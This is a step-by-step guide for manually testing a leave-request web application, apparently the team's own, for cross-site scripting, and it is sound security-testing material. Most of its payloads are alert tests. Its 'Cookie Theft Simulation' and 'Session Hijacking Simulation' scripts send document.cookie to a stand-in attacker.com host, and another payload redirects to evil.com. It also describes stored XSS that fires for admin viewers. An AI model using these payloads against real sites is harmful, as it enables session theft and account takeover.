# Manual XSS Testing - Step-by-Step Guide

## Prerequisites
- E-Connect application running (frontend + backend)
- Browser with Developer Tools (Chrome/Firefox recommended)
- Test user account credentials

## Phase 1: Basic XSS Testing

### Step 1: Prepare Your Testing Environment

1. **Open Browser Developer Tools**:
   - Press `F12` or `Ctrl+Shift+I`
   - Go to **Console** tab (keep it open during testing)
   - Go to **Network** tab (to monitor requests)

2. **Login to E-Connect**:
   - Navigate to `http://localhost:3000` (or your frontend URL)
   - Login with your test credentials

### Step 2: Test Leave Request Form

#### Test 2.1: Basic Script Tag
1. **Navigate** to Leave Request page (`/User/Leaverequest`)
2. **Select** "Sick Leave"
3. **Pick any date** (today or future date)
4. **In Reason field, enter**:
   ```html
   <script>alert('XSS Test 1')</script>
   ```
5. **Click Apply**
6. **Watch for**:
   - Alert popup appearing
   - Console errors
   - How the text displays on screen

#### Test 2.2: Image-based XSS
1. **Clear the reason field**
2. **Enter**:
   ```html
   <img src=x onerror=alert('XSS Test 2')>
   ```
3. **Submit form**
4. **Check if alert appears**

#### Test 2.3: SVG-based XSS
1. **Clear the reason field**
2. **Enter**:
   ```html
   <svg onload=alert('XSS Test 3')>
   ```
3. **Submit form**
4. **Watch for JavaScript execution**

#### Test 2.4: Event Handler XSS
1. **Clear the reason field**
2. **Enter**:
   ```html
   " onmouseover="alert('XSS Test 4')"
   ```
3. **Submit form**
4. **If text appears, hover over it**

### Step 3: Test Other Leave Types

#### Test Permission Request
1. **Select** "Permission"
2. **Pick date and time slot**
3. **In reason field, try**:
   ```html
   <script>document.location='http://evil.com'</script>
   ```
4. **Submit and monitor Network tab for unexpected requests**

#### Test Other Leave Request
1. **Select** "Other Leave"
2. **Pick from/to dates**
3. **In reason field, try**:
   ```html
   <iframe src=javascript:alert('XSS')></iframe>
   ```
4. **Submit form**

## Phase 2: Advanced Manual Testing

### Step 4: Test Multiple Input Fields

Try XSS payloads in ALL input fields:

#### Employee Name Field (if editable)
```html
<script>alert('Name XSS')</script>
```

#### Date Fields
```html
<script>alert('Date XSS')</script>
```

### Step 5: Admin Panel Testing

1. **Login as Admin** (if you have admin credentials)
2. **Go to Leave Approval page** (`/Admin/Leave_approval`)
3. **Look for your submitted requests**
4. **Check if XSS executes when admin views the data**

If you don't have admin access, ask someone with admin rights to check the approval page after you submit XSS payloads.

### Step 6: Browser Developer Tools Investigation

#### Check HTML Source
1. **After submitting XSS payload**
2. **Go to Elements tab in DevTools**
3. **Find where your reason text appears**
4. **Right-click on the text → Inspect Element**
5. **Check the actual HTML**:
   - Is it `&lt;script&gt;` (escaped) ✅ Good
   - Or is it `<script>` (unescaped) ❌ Vulnerable

#### Check Network Requests
1. **Go to Network tab**
2. **Submit form with XSS payload**
3. **Look at the POST request**:
   - Click on the request
   - Check **Request Payload**
   - See how data is sent to server
4. **Check the Response**:
   - Is XSS payload returned as-is?
   - Is it encoded/escaped?

### Step 7: URL-based XSS Testing

#### Test URL Parameters
1. **Try modifying URLs**:
   ```
   http://localhost:3000/User/Leaverequest?test=<script>alert('URL XSS')</script>
   ```
2. **Check if payload executes**
3. **Try encoded versions**:
   ```
   http://localhost:3000/User/Leaverequest?test=%3Cscript%3Ealert('XSS')%3C/script%3E
   ```

## Phase 3: Persistence Testing

### Step 8: Stored XSS Testing

1. **Submit XSS payload in leave request**
2. **Logout and login again**
3. **Check Leave History**:
   - Go to `/User/LeaveHistory`
   - See if XSS executes when viewing your own history
4. **Have admin check approval page**
5. **Check if XSS executes for admin**

## Phase 4: Real-World Payloads

### Step 9: Test Practical Attack Scenarios

#### Cookie Theft Simulation
```html
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
```

#### Session Hijacking Simulation
```html
<script>
new Image().src = 'http://attacker.com/log?cookie=' + document.cookie;
</script>
```

#### DOM Manipulation
```html
<script>
document.body.innerHTML = '<h1>Site Defaced by XSS</h1>';
</script>
```

## What to Look For During Testing

### ✅ Signs of Successful XSS:
- **Alert boxes appear**
- **Console shows executed JavaScript**
- **Network tab shows requests to external sites**
- **Page content changes unexpectedly**
- **Browser redirects to other sites**

### ✅ Signs of Good Protection:
- **Payloads appear as plain text**
- **HTML shows escaped entities** (`&lt;` instead of `<`)
- **Console shows "Content Security Policy" errors**
- **No JavaScript execution**

## Documentation Template

For each test, document:

```
Test #: ___
Payload: _______________
Location: ______________
Result: ________________
Screenshot: ____________
```

## Step-by-Step Checklist

### Before Testing:
- [ ] Backend server running
- [ ] Frontend server running  
- [ ] Browser DevTools open
- [ ] Test credentials ready

### During Testing:
- [ ] Test basic `<script>` tags
- [ ] Test image-based XSS
- [ ] Test SVG-based XSS
- [ ] Test event handlers
- [ ] Test all input fields
- [ ] Check admin panels
- [ ] Test URL parameters
- [ ] Check for stored XSS

### After Testing:
- [ ] Document all findings
- [ ] Take screenshots of successful XSS
- [ ] Note which protections worked
- [ ] Report vulnerabilities found

## Quick Manual Test Commands

### Test 1 - Basic Alert
```html
<script>alert('XSS')</script>
```

### Test 2 - Console Log
```html
<script>console.log('XSS Executed')</script>
```

### Test 3 - DOM Check
```html
<script>document.title='XSS Works'</script>
```

### Test 4 - Image Error
```html
<img src=x onerror=alert('IMG XSS')>
```

### Test 5 - SVG Load
```html
<svg onload=alert('SVG XSS')>
```

## Expected Results Based on Security Assessment

From our automated testing, we found:
- **XSS vulnerabilities exist** in the application
- **Some input validation** might be missing
- **React provides some protection** but may not be complete

Focus your manual testing on:
1. **Confirming automated findings**
2. **Testing bypass techniques**
3. **Finding new attack vectors**
4. **Testing admin/privileged views**

Remember: The goal is to find where XSS can execute, not just where payloads can be stored!
